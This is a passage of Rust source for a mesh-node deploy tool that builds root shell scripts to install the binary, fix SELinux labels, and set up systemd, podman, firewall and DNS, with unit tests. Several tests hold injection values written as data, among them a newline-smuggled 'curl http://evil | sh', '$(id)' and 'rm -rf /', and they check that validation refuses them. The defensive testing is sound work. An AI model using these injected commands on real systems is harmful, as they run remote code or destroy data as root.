    /// This exists because of `mv`. Staging writes the binary to `/tmp`
    /// and the install moves it into place, and a move within one
    /// filesystem is `rename(2)`, which carries the source's label with
    /// it. So on a labelled machine the binary lands in `/usr/local/bin`
    /// still wearing `user_tmp_t`, `init_t` may not `execve` that, and
    /// systemd reports `203/EXEC` — *"Unable to locate executable:
    /// Permission denied"*, which names neither the file's real problem
    /// nor SELinux, and reads exactly like a path or ownership mistake on
    /// a file that is `0755 root:root` and perfectly fine.
    ///
    /// `restorecon` asks the policy what the label should be, which is the
    /// right question — `/usr/local/bin(/.*)?` is `bin_t`, a unit file is
    /// `systemd_unit_file_t`, and neither is something to hard-code here.
    /// `chcon` is the fallback for a machine with `coreutils` but not
    /// `policycoreutils`. It can only be *told* a type, so it is only used
    /// where there is one right answer to tell it — `None` everywhere
    /// else, because a guessed label inside somebody's home directory is
    /// worse than the one the move left behind.
    ///
    /// Silent and non-fatal on a machine with neither tool: that machine
    /// has no labels to get wrong.
    fn relabel(path: &str, fallback_type: Option<&str>) -> String {
        let path = shell_quote(path);
        let mut s = format!(
            "if command -v restorecon >/dev/null 2>&1; then restorecon -F {path} >/dev/null 2>&1 || true\n"
        );
        if let Some(ty) = fallback_type {
            s.push_str(&format!(
                "elif command -v chcon >/dev/null 2>&1 && [ -d /sys/fs/selinux ]; then chcon -t {ty} {path} >/dev/null 2>&1 || true\n"
            ));
        }
        s.push_str("fi\n");
        s
    }

    /// Phase 3, privileged for a system install: put the staged binary in
    /// place and make the machine ready to run it as a service.
    ///
    /// Enables the unit but does **not** start it: the node has no identity
    /// until it has paired, and a daemon started before that would found a
    /// mesh of its own.
    ///
    /// `staged` is `None` when the machine already runs the right binary
    /// at the right path: everything but the file move still happens, so a
    /// node installed by hand ends up with the same unit, drop-in and
    /// firewall rule as one installed from here.
    pub fn install_script(&self, staged: Option<&str>) -> String {
        let bin = shell_quote(&self.install_path);
        let dir = shell_quote(&self.install_dir());
        let data = shell_quote(&self.data_dir);
        let conf = shell_quote(&self.config_home);
        let svc = shell_quote(&self.service_user);
        let mut s = String::new();
        s.push_str("set -e\n");
        s.push_str(&format!("mkdir -p {dir}\n"));
        if let Some(staged) = staged {
            let staged = shell_quote(staged);
            s.push_str(&format!("mv -f {staged} {bin}\n"));
            s.push_str(&format!("chmod 755 {bin}\n"));
            if self.scope == Scope::System {
                s.push_str(&format!("chown root:root {bin} 2>/dev/null || true\n"));
            }
        }
        // Outside the `staged` branch on purpose. A move brings `/tmp`'s
        // label with it, so a binary just installed needs this — and a
        // binary installed by an *older* build of this tool needs it more,
        // because that machine is already broken and re-running the
        // install is the obvious thing its owner will try. Relabelling
        // what is already correctly labelled costs nothing.
        s.push_str(&InstallPlan::relabel(
            &self.install_path,
            match self.scope {
                Scope::System => Some("bin_t"),
                // A user install lives in a home directory, where the
                // right type is whatever the policy says and never
                // something worth guessing.
                Scope::User => None,
            },
        ));
        match self.scope {
            Scope::System => {
                // The service account. `useradd` on glibc distributions,
                // `adduser` on busybox (Alpine); the nologin shell lives in
                // two places and either is fine.
                s.push_str(&format!(
                    "if ! getent passwd {svc} >/dev/null 2>&1; then\n\
                       if command -v useradd >/dev/null 2>&1; then\n\
                         sh=/usr/sbin/nologin; [ -x \"$sh\" ] || sh=/sbin/nologin; [ -x \"$sh\" ] || sh=/bin/false\n\
                         useradd --system --home-dir {data} --shell \"$sh\" {svc}\n\
                       elif command -v adduser >/dev/null 2>&1; then\n\
                         adduser -S -D -H -h {data} -s /sbin/nologin {svc}\n\
                       else\n\
                         echo 'mw.error=no useradd or adduser on this machine'; exit 1\n\
                       fi\n\
                     fi\n"
                ));
                s.push_str(&format!(
                    "mkdir -p {data} {conf}/meshware\n\
                     chown {svc}:{svc} {data}\n\
                     chmod 750 {data}\n"
                ));
                // **A sub-id range, because `--system` allocates none.**
                //
                // Rootless podman needs one and `podman info` answers fine
                // without it, so a node deployed this way detected its
                // engine, announced that it could run containers, took the
                // work, and died deep in the image unpack:
                //
                //   potentially insufficient UIDs or GIDs available in user
                //   namespace (requested 0:42 for /etc/shadow) …
                //   lchown /etc/shadow: invalid argument
                //
                // `/etc/shadow` in a stock image is owned by `0:42`, and
                // with no delegated range there is no gid 42 to map it to.
                // Found on a real fleet where every remotely-deployed node
                // failed identically and the one installed by hand, as a
                // login user, worked. This path made the user, so this path
                // gives it what the user needs.
                //
                // Tolerant of failure: `usermod` refuses an overlapping
                // range rather than corrupting one, a machine may have no
                // `usermod` at all (busybox), and none of that should stop
                // a node joining. `meshnode runtimes` reports the
                // consequence either way, by name.
                // `u` because `{svc}` arrives already shell-quoted, and
                // splicing it into a `grep '^…:'` pattern produces
                // `'^'meshnode':'` — correct by quote concatenation, and
                // unreadable to whoever has to audit this script.
                // Deliberately **outside** the `getent passwd` guard above,
                // so re-running an install against a node deployed before
                // this existed repairs it. `grep -q` keeps it idempotent.
                s.push_str(&format!(
                    // `if ! grep && usermod` rather than `grep || { … }`:
                    // this script runs under `set -e`, and a group on the
                    // right of `||` carries its own exit status, so a
                    // `usermod` that refuses an overlapping range would
                    // abort the whole install. An `if` condition never does.
                    "if command -v usermod >/dev/null 2>&1; then\n\
                       u={svc}; mw_ids_changed=\n\
                       if ! grep -q \"^$u:\" /etc/subuid 2>/dev/null \
                          && usermod --add-subuids 2000000-2065535 \"$u\" >/dev/null 2>&1; \
                       then mw_ids_changed=1; fi\n\
                       if ! grep -q \"^$u:\" /etc/subgid 2>/dev/null \
                          && usermod --add-subgids 2000000-2065535 \"$u\" >/dev/null 2>&1; \
                       then mw_ids_changed=1; fi\n\
                     fi\n"
                ));
                // And a user session, so podman uses the systemd cgroup
                // manager rather than printing four warnings and falling
                // back to cgroupfs on every single container start.
                // **Before the migrate below**, not after: lingering is
                // what creates `/run/user/<uid>`, and podman needs that
                // directory to do anything as a `nologin` account.
                s.push_str(&format!(
                    "command -v loginctl >/dev/null 2>&1 && \
                     loginctl enable-linger {svc} >/dev/null 2>&1 || true\n"
                ));
                // **Re-map the storage, but only if the range moved.**
                //
                // A node that has already *tried* to run a container — which
                // is every node that failed this way, since it got as far as
                // unpacking layers — has a storage tree initialised under the
                // old, empty mapping. Adding the range does not fix that
                // retroactively; podman's own error says to run `podman
                // system migrate`, and without it a re-deploy would leave the
                // node failing in exactly the same place while looking like
                // it had been repaired.
                //
                // Guarded on having changed something, because a migrate
                // **stops running containers** — doing it on every deploy
                // would turn a routine re-install into an outage.
                // `su -l`, not `runuser -u` or a bare `sudo -u`, and the
                // difference is the whole of whether this works:
                //
                // - **`-l` gives a login environment**, which sets `HOME` to
                //   the service account's own directory. Without it `HOME`
                //   stays whoever ran the install, and podman looks for the
                //   container storage somewhere the service user cannot
                //   read.
                // - **`-l` also changes directory**, to that same home. A
                //   command that inherits the caller's cwd fails with
                //   `cannot chdir to /home/<you>: Permission denied` —
                //   podman has to enter the cwd while setting up the user
                //   namespace, and a service account cannot enter yours.
                //   Deploying from a login shell hit exactly that.
                // - **`-s /bin/sh`** because the account's shell is
                //   `nologin`, which is what makes it a service account.
                s.push_str(
                    "if [ -n \"${mw_ids_changed:-}\" ] && command -v podman >/dev/null 2>&1; then\n\
                       su -s /bin/sh -l -c 'podman system migrate' \"$u\" >/dev/null 2>&1 || true\n\
                     fi\n",
                );
                s.push_str(
                    "if [ -d /run/systemd/system ] && command -v systemctl >/dev/null 2>&1; then\n",
                );
                s.push_str(&heredoc(
                    "/etc/systemd/system/meshnode.service",
                    &self.unit_text(),
                ));
                s.push_str(&InstallPlan::relabel(
                    "/etc/systemd/system/meshnode.service",
                    Some("systemd_unit_file_t"),
                ));
                if self.fleet_upgrade {
                    s.push_str("  mkdir -p /etc/systemd/system/meshnode.service.d\n");
                    s.push_str(&heredoc(
                        "/etc/systemd/system/meshnode.service.d/fleet-upgrade.conf",
                        &self.dropin_text(),
                    ));
                    s.push_str(&InstallPlan::relabel(
                        "/etc/systemd/system/meshnode.service.d/fleet-upgrade.conf",
                        Some("systemd_unit_file_t"),
                    ));
                } else {
                    s.push_str(
                        "  rm -f /etc/systemd/system/meshnode.service.d/fleet-upgrade.conf\n",
                    );
                }
                // **Containers (T2): the account's own podman service.**
                s.push_str(&self.engine_service_script());
                // **The retired mesh proxy's grant, taken back.** A node
                // deployed while the proxy existed was given
                // CAP_NET_BIND_SERVICE so it could listen on port 80.
                // Nothing in the node binds a low port now, and a privilege
                // nothing uses is one to remove, not to leave lying around.
                // The `daemon-reload` below picks the removal up.
                s.push_str(&format!(
                    "  rm -f {}\n",
                    crate::dnssetup::LEGACY_SERVICE_DROPIN
                ));
                // Route `.mesh` to the responder where systemd-resolved
                // runs, so `dig web.mesh` works on the node itself.
                let dns =
                    std::net::SocketAddr::from(([127, 0, 0, 1], mesh_proto::DEFAULT_DNS_PORT));
                s.push_str(
                    "  if systemctl is-active --quiet systemd-resolved; then\n  mkdir -p /etc/systemd/resolved.conf.d\n",
                );
                s.push_str("  if resolvectl dnssec 2>/dev/null | grep -qx 'Global: no'; then\n");
                s.push_str(&heredoc(
                    crate::dnssetup::RESOLVED_DROPIN,
                    &crate::dnssetup::resolved_dropin(dns, false),
                ));
                s.push_str("  else\n");
                s.push_str(&heredoc(
                    crate::dnssetup::RESOLVED_DROPIN,
                    &crate::dnssetup::resolved_dropin(dns, true),
                ));
                s.push_str(
                    "  fi\n  systemctl restart systemd-resolved\n  echo mw.resolver=routed\n",
                );
                s.push_str("  else echo mw.resolver=manual; fi\n");
                // `enable` is what makes the node come back after a
                // reboot, so whether it took is reported rather than
                // swallowed: a machine that silently rejoins the mesh
                // until its next power cut is the worst kind of working.
                s.push_str(
                    "  systemctl daemon-reload\n\
                       if systemctl enable meshnode >/dev/null 2>&1; then echo mw.enabled=yes; else echo mw.enabled=no; fi\n\
                       echo mw.service=systemd\n\
                     else\n\
                       echo mw.service=none\n\
                     fi\n",
                );
                if self.open_firewall {
                    s.push_str(&self.firewall_script());
                }
            }
            Scope::User => {
                s.push_str(&format!("mkdir -p {data} {conf}\nchmod 700 {data}\n"));
                s.push_str(
                    "if [ -d /run/systemd/system ] && command -v systemctl >/dev/null 2>&1 && systemctl --user show-environment >/dev/null 2>&1; then\n\
                       mkdir -p \"$HOME/.config/systemd/user\"\n",
                );
                s.push_str(&heredoc(
                    "\"$HOME/.config/systemd/user/meshnode.service\"",
                    &self.user_unit_text(),
                ));
                s.push_str(
                    "  systemctl --user daemon-reload\n\
                       if systemctl --user enable meshnode >/dev/null 2>&1; then echo mw.enabled=yes; else echo mw.enabled=no; fi\n\
                       echo mw.service=systemd-user\n\
                     else\n\
                       echo mw.service=none\n\
                     fi\n",
                );
            }
        }
        s.push_str("echo mw.installed=ok\n");
        s
    }

    /// Open the mesh port where a firewall is running. Reports which one,
    /// or `none` — a machine with no firewall is not an error.
    pub fn firewall_script(&self) -> String {
        let port = self.port;
        format!(
            "if command -v firewall-cmd >/dev/null 2>&1 && firewall-cmd --state >/dev/null 2>&1; then\n\
               firewall-cmd --permanent --add-port={port}/udp >/dev/null 2>&1 && firewall-cmd --reload >/dev/null 2>&1 && echo mw.firewall=firewalld || echo mw.firewall=failed\n\
             elif command -v ufw >/dev/null 2>&1 && ufw status 2>/dev/null | grep -q '^Status: active'; then\n\
               ufw allow {port}/udp >/dev/null 2>&1 && echo mw.firewall=ufw || echo mw.firewall=failed\n\
             else\n\
               echo mw.firewall=none\n\
             fi\n"
        )
    }

    /// The system unit, from the packaged one, with `ExecStart` and the
    /// directories pointed where this plan puts them.
    pub fn unit_text(&self) -> String {
        let mut unit = UNIT_TEMPLATE.to_string();
        for (anchor, replacement) in [
            (
                UNIT_EXEC_ANCHOR,
                format!("ExecStart={} up", self.install_path),
            ),
            (
                UNIT_DATA_ANCHOR,
                format!("Environment=MESHWARE_DATA_DIR={}", self.data_dir),
            ),
            (
                UNIT_CONFIG_ANCHOR,
                format!("Environment=XDG_CONFIG_HOME={}", self.config_home),
            ),
            (UNIT_RW_ANCHOR, format!("ReadWritePaths={}", self.data_dir)),
        ] {
            debug_assert!(unit.contains(anchor), "packaged unit lost `{anchor}`");
            unit = unit.replace(anchor, &replacement);
        }
        if self.service_user != "meshnode" {
            unit = unit
                .replace("User=meshnode", &format!("User={}", self.service_user))
                .replace("Group=meshnode", &format!("Group={}", self.service_user));
        }
        unit
    }

    /// The fleet-upgrade drop-in, pointed at this plan's install directory.
    pub fn dropin_text(&self) -> String {
        debug_assert!(DROPIN_TEMPLATE.contains(DROPIN_RW_ANCHOR));
        DROPIN_TEMPLATE.replace(
            DROPIN_RW_ANCHOR,
            &format!("ReadWritePaths={}", self.install_dir()),
        )
    }

    /// A `systemctl --user` unit. No hardening lines: those need root to
    /// mean anything, and a user unit runs as the user regardless.
    ///
    /// Restart and readiness match the packaged unit (ENG-1): `notify`, a
    /// watchdog fed only while the node works, and a restart after any
    /// exit but the two deliberate refusals.
    pub fn user_unit_text(&self) -> String {
        format!(
            "# Meshware Node — user service, written by Director / `meshnode adopt`.\n\
             # Runs as this account. It stops at logout unless lingering is on:\n\
             #   loginctl enable-linger $USER\n\
             [Unit]\n\
             Description=Meshware Node — governed compute mesh daemon (user)\n\
             After=network-online.target\n\
             StartLimitIntervalSec=300\n\
             StartLimitBurst=10\n\
             \n\
             [Service]\n\
             Type=notify\n\
             NotifyAccess=main\n\
             WatchdogSec=90\n\
             ExecStart={} up\n\
             ExecReload=/bin/kill -HUP $MAINPID\n\
             Restart=always\n\
             RestartSec=2\n\
             RestartPreventExitStatus=65 78\n\
             Environment=MESHWARE_DATA_DIR={}\n\
             Environment=XDG_CONFIG_HOME={}\n\
             \n\
             [Install]\n\
             WantedBy=default.target\n",
            self.install_path, self.data_dir, self.config_home
        )
    }

    // -- join ---------------------------------------------------------------

    /// The joiner, to be run **as the service account** with the service's
    /// environment. The caller wraps it with [`Privilege::wrap`].
    pub fn join_command(&self, tags: &[String], wait_secs: u64, node_name: Option<&str>) -> String {
        let mut cmd = self.env_prefix();
        if let Some(name) = node_name.map(str::trim).filter(|n| !n.is_empty()) {
            cmd.push_str(&format!(" MESHWARE_NODE_NAME={}", shell_quote(name)));
        }
        cmd.push_str(&format!(
            " {} join --pair --json --wait {wait_secs}s",
            shell_quote(&self.install_path)
        ));
        for tag in tags {
            cmd.push_str(&format!(" --tag {}", shell_quote(tag)));
        }
        cmd
    }

    /// The account the joiner runs as, or `None` when it is the SSH
    /// account itself.
    pub fn run_as(&self) -> Option<&str> {
        match self.scope {
            Scope::System => Some(&self.service_user),
            Scope::User => None,
        }
    }

    // -- start / restart ----------------------------------------------------

    /// Start the service (privileged for a system install). Reports
    /// `mw.started=systemd|systemd-user|nohup`.
    ///
    /// The `nohup` fallback is for a machine with no systemd (a container,
    /// an OpenRC box): the daemon survives the SSH session, logs into its
    /// data directory, and comes back only when somebody starts it — which
    /// the report says.
    pub fn start_script(&self) -> String {
        let bin = shell_quote(&self.install_path);
        let data = shell_quote(&self.data_dir);
        let env = self.env_prefix();
        match self.scope {
            // Without systemd the daemon still runs as the service account,
            // never as root: `runuser` where it exists, `su` otherwise. The
            // log file is opened by this (root) shell and inherited, so the
            // account needs no write access to create it.
            Scope::System => {
                let svc = shell_quote(&self.service_user);
                let via_su = shell_quote(&format!("exec {env} {bin} up"));
                format!(
                    "set -e\n\
                     if [ -d /run/systemd/system ] && command -v systemctl >/dev/null 2>&1; then\n\
                       if systemctl start meshnode; then echo mw.started=systemd; else\n\
                         {diagnose}\
                         exit 1\n\
                       fi\n\
                     elif command -v runuser >/dev/null 2>&1; then\n\
                       nohup runuser -u {svc} -- {env} {bin} up >{data}/meshnode.log 2>&1 </dev/null &\n\
                       echo mw.started=nohup\n\
                     else\n\
                       nohup su -s /bin/sh {svc} -c {via_su} >{data}/meshnode.log 2>&1 </dev/null &\n\
                       echo mw.started=nohup\n\
                     fi\n",
                    diagnose = Self::start_diagnosis(&self.install_path),
                )
            }
            Scope::User => format!(
                "set -e\n\
                 if [ -d /run/systemd/system ] && command -v systemctl >/dev/null 2>&1 && systemctl --user show-environment >/dev/null 2>&1; then\n\
                   systemctl --user start meshnode\n\
                   loginctl enable-linger \"$(id -un)\" >/dev/null 2>&1 && echo mw.linger=on || echo mw.linger=off\n\
                   echo mw.started=systemd-user\n\
                 else\n\
                   nohup sh -c 'exec {env} {bin} up' >{data}/meshnode.log 2>&1 </dev/null &\n\
                   echo mw.started=nohup\n\
                 fi\n"
            ),
        }
    }

    /// What to ask the machine when `systemctl start` has just failed.
    ///
    /// A failed start reports itself as *"Job for meshnode.service failed
    /// … see `systemctl status`"*, which is a pointer to an answer rather
    /// than an answer, and the person reading it is on another machine.
    /// So the two facts that distinguish the causes are collected on the
    /// spot: the exit status systemd saw, and — since `203/EXEC` on a
    /// labelled machine means the label and not the file — the binary's
    /// SELinux context. [`start_failure_hint`] turns them into a sentence.
    fn start_diagnosis(bin: &str) -> String {
        let bin = shell_quote(bin);
        // The mode as well as the context, because `stat -c %C` is a GNU
        // spelling and busybox has neither it nor an answer — and on a
        // machine where the label cannot be read, *that the machine
        // labels at all* is still most of the diagnosis.
        format!(
            "  s=$(systemctl show -p ExecMainStatus --value meshnode 2>/dev/null); printf 'mw.exec_status=%s\\n' \"$s\"\n\
               if [ -d /sys/fs/selinux ]; then\n\
                 printf 'mw.exec_context=%s\\n' \"$(stat -c %C {bin} 2>/dev/null)\"\n\
                 if [ \"$(cat /sys/fs/selinux/enforce 2>/dev/null)\" = 1 ]; then echo mw.selinux=enforcing; else echo mw.selinux=permissive; fi\n\
               fi\n"
        )
    }

    /// The service account's own podman service, for a system install:
    /// podman's stock `podman.socket` in the account's user manager, moved
    /// to `run/podman.sock` in the node's home, where the unit can reach it
    /// (`crate::engines`, *Where containers are made*).
    ///
    /// Root, inside the systemd branch of a script. Idempotent, and it
    /// restarts the socket only when its drop-in changed: an `Update over
    /// SSH` to a node that already has it must not drop the connections of
    /// containers that are running. Reports `mw.engine=podman.socket`,
    /// `failed` or `none` (no podman, or no stock unit to start).
    ///
    /// It also takes back what the old way needed: `meshnode.service` no
    /// longer execs `newuidmap`, so the drop-in that gave it
    /// `NoNewPrivileges=false` and four capabilities for it is removed —
    /// and the sysctl drop-in a development build wrote, which would only
    /// cost `ping` inside a container now.
    fn engine_service_script(&self) -> String {
        let data = shell_quote(&self.data_dir);
        let svc = shell_quote(&self.service_user);
        let dir = format!("{data}/.config/systemd/user/podman.socket.d");
        let dropin = format!("{dir}/50-meshware.conf");
        let mut s = String::new();
        s.push_str(
            "  rm -f /etc/systemd/system/meshnode.service.d/containers.conf\n\
             if command -v podman >/dev/null 2>&1 \\\n\
                && { [ -e /usr/lib/systemd/user/podman.socket ] || [ -e /lib/systemd/user/podman.socket ]; }; then\n",
        );
        s.push_str(&format!(
            "  mw_uid=$(id -u {svc})\n\
             command -v loginctl >/dev/null 2>&1 && loginctl enable-linger {svc} >/dev/null 2>&1 || true\n\
             mkdir -p {dir} {data}/run\n"
        ));
        s.push_str(&heredoc(
            &format!("{dropin}.new"),
            &engine_socket_dropin(&self.data_dir),
        ));
        s.push_str(&format!(
            "  if cmp -s {dropin}.new {dropin}; then rm -f {dropin}.new; mw_sock=start; \
             else mv -f {dropin}.new {dropin}; mw_sock=restart; fi\n\
             chown -R {svc}:{svc} {data}/.config\n\
             chown {svc}:{svc} {data}/run\n\
             rm -f {data}/.config/containers/containers.conf.d/50-meshware-sysctls.conf\n\
             mw_dd=/etc/systemd/system/user@$mw_uid.service.d\n\
             if [ ! -e \"$mw_dd/50-meshware-delegate.conf\" ]; then\n\
               mkdir -p \"$mw_dd\"\n"
        ));
        s.push_str(&heredoc(
            "\"$mw_dd/50-meshware-delegate.conf\"",
            ENGINE_DELEGATE_DROPIN,
        ));
        // A manager started before the drop-in has the old delegation until
        // it restarts. Only the first time, when nothing of this account's
        // runs under it yet; after that the file exists and this is skipped.
        s.push_str(
            "    { command -v restorecon >/dev/null 2>&1 && restorecon -RF \"$mw_dd\" >/dev/null 2>&1; } || true\n\
                 systemctl daemon-reload\n\
                 systemctl try-restart \"user@$mw_uid.service\" >/dev/null 2>&1 || true\n\
               fi\n",
        );
        // Lingering starts the account's manager; its private socket is
        // what `systemctl --user` talks to, with no D-Bus session needed.
        s.push_str(&format!(
            "  i=0; while [ ! -S \"/run/user/$mw_uid/systemd/private\" ] && [ $i -lt 100 ]; do sleep 0.1; i=$((i+1)); done\n\
             mw_user() {{ runuser -u {svc} -- env XDG_RUNTIME_DIR=\"/run/user/$mw_uid\" systemctl --user \"$@\"; }}\n\
             if mw_user daemon-reload && mw_user enable podman.socket >/dev/null 2>&1 \\\n\
                && mw_user \"$mw_sock\" podman.socket; then echo mw.engine=podman.socket; else echo mw.engine=failed; fi\n\
             else echo mw.engine=none; fi\n"
        ));
        s
    }

    /// Put a staged binary in place of the installed one and restart the
    /// daemon. Reports `mw.restarted=…`, or `mw.owner=dpkg|rpm` with exit
    /// status 3 when a package manager owns the file — that one is
    /// upgraded through the package manager, never by hand.
    pub fn upgrade_script(&self, staged: &str) -> String {
        let staged = shell_quote(staged);
        let bin = shell_quote(&self.install_path);
        let user_flag = match self.scope {
            Scope::System => "",
            Scope::User => " --user",
        };
        format!(
            "set -e\n\
             if [ -r /var/lib/dpkg/info/meshnode.list ] && grep -qx {bin} /var/lib/dpkg/info/meshnode.list 2>/dev/null; then echo mw.owner=dpkg; exit 3; fi\n\
             if command -v rpm >/dev/null 2>&1 && rpm -qf {bin} >/dev/null 2>&1; then echo mw.owner=rpm; exit 3; fi\n\
             mv -f {staged} {bin}\n\
             chmod 755 {bin}\n\
             {chown}\
             {relabel}\
             if [ -d /run/systemd/system ] && command -v systemctl >/dev/null 2>&1 && systemctl{user_flag} cat meshnode >/dev/null 2>&1; then\n\
             {engine}\
               systemctl{user_flag} restart meshnode\n\
               echo mw.restarted=systemd\n\
             else\n\
               echo mw.restarted=none\n\
             fi\n",
            chown = if self.scope == Scope::System {
                format!("chown root:root {bin} 2>/dev/null || true\n")
            } else {
                String::new()
            },
            // An upgrade is also how a node installed before the podman
            // service existed gets it: this is the one privileged step an
            // installed node sees, and `Update over SSH` is what somebody
            // reaches for when a machine is not doing what it should.
            engine = if self.scope == Scope::System {
                format!(
                    "{}  systemctl daemon-reload\n",
                    self.engine_service_script()
                )
            } else {
                String::new()
            },
            // The swap is a `mv` too, so the new binary arrives wearing
            // the staging directory's label. An upgrade that left the node
            // unable to start is the same bug as an install that did.
            relabel = InstallPlan::relabel(
                &self.install_path,
                match self.scope {
                    Scope::System => Some("bin_t"),
                    Scope::User => None,
                },
            ),
        )
    }

    /// Stop the service and move the node's data aside, for re-adopting a
    /// machine that already belongs to a mesh. Moved, not deleted: an
    /// identity is not something a deploy tool erases.
    pub fn reset_script(&self) -> String {
        let data = shell_quote(&self.data_dir);
        let user_flag = match self.scope {
            Scope::System => "",
            Scope::User => " --user",
        };
        format!(
            "if [ -d /run/systemd/system ] && command -v systemctl >/dev/null 2>&1; then systemctl{user_flag} stop meshnode >/dev/null 2>&1 || true; fi\n\
             if [ -e {data}/mesh/genesis.json ]; then\n\
               mv {data} {data}.replaced-$(date +%Y%m%d-%H%M%S)\n\
               echo mw.reset=moved\n\
             else\n\
               echo mw.reset=none\n\
             fi\n"
        )
    }
}

/// An absolute path that may be written into a systemd unit (S-M5).
///
/// A unit file is line-oriented and unquoted, so a newline in a value is a
/// new *directive*; the script that writes it is a heredoc run as root, so a
/// line matching the delimiter ends it. Both are refused here rather than
/// escaped, because there is no legitimate install path with a newline in it
/// and pretending otherwise means carrying an escaping story for something
/// nobody wants.
fn check_unit_path(what: &str, path: &str) -> Result<(), String> {
    if path.is_empty() {
        return Err(format!("{what} is empty"));
    }
    if !path.starts_with('/') {
        return Err(format!("{what} must be absolute: {path:?}"));
    }
    if path.len() > 1024 {
        return Err(format!("{what} is implausibly long"));
    }
    if let Some(bad) = path.chars().find(|c| c.is_control() || c.is_whitespace()) {
        return Err(format!(
            "{what} may not contain whitespace or control characters ({bad:?}): {path:?}"
        ));
    }
    // `Environment=`, `ExecStart=` and `ReadWritePaths=` all take this
    // unquoted, and a quote or a `%` specifier in it changes what systemd
    // reads rather than what it writes.
    if let Some(bad) = path.chars().find(|c| matches!(c, '"' | '\'' | '%' | '$')) {
        return Err(format!("{what} may not contain {bad:?}: {path:?}"));
    }
    Ok(())
}

/// A Unix account name the unit may name in `User=` / `Group=`.
fn check_service_user(user: &str) -> Result<(), String> {
    if user.is_empty() {
        return Err("the service account has no name".into());
    }
    if user.len() > 32 {
        return Err(format!("{user:?} is too long for a Unix account name"));
    }
    if user.starts_with('-') {
        return Err(format!("{user:?} is not a usable account name"));
    }
    if !user
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '$'))
    {
        return Err(format!(
            "{user:?} is not a usable account name — letters, digits, '.', '_' and '-'"
        ));
    }
    Ok(())
}

/// `cat > <path> <<'MW_EOF' … MW_EOF`, for a script read from stdin.
///
/// The delimiter is **chosen against the body** (S-M5). It used to be the
/// constant `MW_EOF` with a `debug_assert!` that the body did not contain
/// it — and a `debug_assert!` is not present in a release build, so the one
/// case it was written for was the one case it did not cover: a body line
/// reading `MW_EOF` ended the document early and everything after it became
/// commands, run as root on the target. Picking a delimiter that does not
/// occur cannot fail, so there is nothing left to assert.
fn heredoc(path: &str, body: &str) -> String {
    let mut delim = String::from("MW_EOF");
    let mut n = 0u32;
    while body.contains(&delim) {
        n += 1;
        delim = format!("MW_EOF_{n}");
    }
    let body = if body.ends_with('\n') {
        body.to_string()
    } else {
        format!("{body}\n")
    };
    format!("  cat > {path} <<'{delim}'\n{body}{delim}\n")
}

#[cfg(test)]
mod tests {
    use super::*;

    /// S-M7: the bound is in the iterator, so a typo costs a comparison.
    ///
    /// `{1..9999999999}` used to `collect()` ten billion `i64` — about 80 GB
    /// — before the `MAX` check it was heading for could run, and
    /// `0.0.0.0/0` collected 4.29 billion `IpAddr` for the same reason. Both
    /// answer immediately now, and with the same message.
    #[test]
    fn an_enormous_range_is_refused_before_it_is_built() {
        let err = expand("rack-{1..9999999999}").expect_err("too many");
        assert!(err.to_string().contains("more than"), "{err}");
        let err = expand("rack-{9999999999..1}").expect_err("too many, reversed");
        assert!(err.to_string().contains("more than"), "{err}");

        let err = expand_all(&["ops@0.0.0.0/0"]).expect_err("the whole internet");
        assert!(err.to_string().contains("addresses"), "{err}");
        let err = expand_all(&["ops@10.0.0.0/8"]).expect_err("still too many");
        assert!(err.to_string().contains("addresses"), "{err}");

        // And the sizes people actually type still work.
        assert_eq!(expand("rack-{1..4}").expect("expands").len(), 4);
        assert_eq!(expand_all(&["10.0.0.0/28"]).expect("expands").len(), 14);
    }

    /// S-M5: an install path is a path, and a heredoc ends where we say.
    #[test]
    fn a_plan_refuses_values_that_would_rewrite_the_unit() {
        let ok = InstallPlan::system(Some("/opt/meshware/bin/meshnode"));
        ok.validate().expect("an ordinary path is fine");

        for bad in [
            // The finding: a newline is a new systemd directive.
            "/usr/local/bin/meshnode\nExecStartPost=/bin/sh -c curl|sh",
            // And a line matching the heredoc delimiter used to end the
            // document early, with the rest run as root.
            "/usr/local/bin/meshnode\nMW_EOF\ncurl http://evil | sh",
            "relative/meshnode",
            "/usr/local/bin/mesh node",
            "/usr/local/bin/$(id)",
            "/usr/local/bin/%h/meshnode",
        ] {
            let plan = InstallPlan::system(Some(bad));
            assert!(
                plan.validate().is_err(),
                "{bad:?} should not survive validation"
            );
        }

        // An *empty* path is not one of these: the constructor reads it as
        // "no preference" and substitutes the default, which is what the
        // form means by leaving the field alone.
        InstallPlan::system(Some(""))
            .validate()
            .expect("an empty path means the default");

        let mut odd_user = InstallPlan::system(None);
        odd_user.service_user = "root\nExecStart=/bin/sh".into();
        assert!(odd_user.validate().is_err());
        odd_user.service_user = "meshnode".into();
        odd_user.validate().expect("the ordinary account is fine");
    }

    /// And the delimiter is chosen against the body, so even a value that
    /// reached `heredoc` some other way cannot close it early.
    #[test]
    fn a_heredoc_delimiter_never_appears_in_its_own_body() {
        let body = "line one\nMW_EOF\nrm -rf /\n";
        let doc = heredoc("/etc/systemd/system/meshnode.service", body);
        // The document opens and closes on the same, unused, delimiter.
        let delim = doc
            .split_once("<<'")
            .and_then(|(_, rest)| rest.split_once('\''))
            .map(|(d, _)| d.to_string())
            .expect("a delimiter");
        assert_ne!(delim, "MW_EOF", "the body already holds MW_EOF");
        assert!(
            !body.contains(&delim),
            "the delimiter must not be in the body"
        );
        assert!(doc.ends_with(&format!("{delim}\n")));
        // Everything the caller asked to write is still there, verbatim.
        assert!(doc.contains(body));
    }

    #[test]
    fn a_numeric_range_expands() {
        assert_eq!(
            expand("ops@rack-{1..4}").expect("expands"),
            ["ops@rack-1", "ops@rack-2", "ops@rack-3", "ops@rack-4"]
        );
    }

    #[test]
    fn a_padded_range_keeps_its_width() {
        assert_eq!(
            expand("rack-{01..03}").expect("expands"),
            ["rack-01", "rack-02", "rack-03"]
        );
        assert_eq!(
            expand("rack-{008..010}").expect("expands"),
            ["rack-008", "rack-009", "rack-010"]
        );
    }

    #[test]
    fn a_descending_range_counts_down() {
        assert_eq!(expand("n{3..1}").expect("expands"), ["n3", "n2", "n1"]);
    }

    #[test]
    fn a_comma_list_expands() {
        assert_eq!(
            expand("{web,db,cache}.local").expect("expands"),
            ["web.local", "db.local", "cache.local"]
        );
    }

    #[test]
    fn several_groups_expand_together() {
        assert_eq!(
            expand("r{1..2}-n{1..2}").expect("expands"),
            ["r1-n1", "r1-n2", "r2-n1", "r2-n2"]
        );
    }

    #[test]
    fn a_plain_target_is_left_alone() {
        assert_eq!(expand("ops@rack-1").expect("expands"), ["ops@rack-1"]);
